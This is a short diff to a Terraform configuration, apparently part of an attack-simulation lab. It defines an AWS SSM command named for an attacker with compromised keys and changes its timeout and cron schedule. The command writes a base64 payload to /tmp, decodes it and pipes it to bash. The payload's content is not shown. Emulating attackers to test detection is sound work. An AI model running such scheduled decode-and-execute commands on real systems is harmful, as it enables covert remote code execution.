@@ -183,7 +183,7 @@ resource "aws_ssm_document" "exec_docker_compromised_keys_attacker" {
                     ]
                 },
                 "inputs": {
-                    "timeoutSeconds": "5400",
+                    "timeoutSeconds": "86400",
                     "runCommand": [
                         "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                     ]
@@ -220,8 +220,8 @@ resource "aws_ssm_association" "exec_docker_compromised_keys_attacker" {
 
     compliance_severity = "HIGH"
 
-    # every 2 hours
-    schedule_expression = "cron(0 */2 * * ? *)"
+    # every day
+    schedule_expression = "cron(0 2 * * ? *)"
     
     # will apply when updated and interval when false
     apply_only_at_cron_interval = false
